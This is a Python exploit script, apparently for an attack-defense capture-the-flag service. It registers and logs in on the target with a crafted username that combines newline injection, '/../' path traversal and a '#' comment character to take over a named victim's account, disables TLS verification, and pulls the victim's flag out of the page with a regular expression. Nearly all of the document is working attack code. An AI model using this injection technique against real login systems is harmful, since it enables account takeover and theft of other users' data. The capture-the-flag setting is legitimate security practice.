#!/usr/bin/env python3

import sys
import json
import re
import random
import string

import requests
requests.packages.urllib3.disable_warnings()

FLAG_REGEX = r'[A-Za-z0-9]{31}='


def rand_str(length: int = 10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def exploit(ip, flag_id):
    url = f'https://{ip}:8443'

    s = requests.Session()

    flag_id = json.loads(flag_id)
    username = flag_id['username']

    u = rand_str()

    s.post(f'{url}/register', verify=False, data={
        'username': f"{u}\n/../{username}#\n_",
        'password': 'password'
    })
    s.post(f'{url}/login', verify=False, data={
        'username': f"{u}\n/../{username}#\n_",
        'password': 'password'
    })
    j = s.get(f'{url}').text

    return re.findall(FLAG_REGEX, j)[0]


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
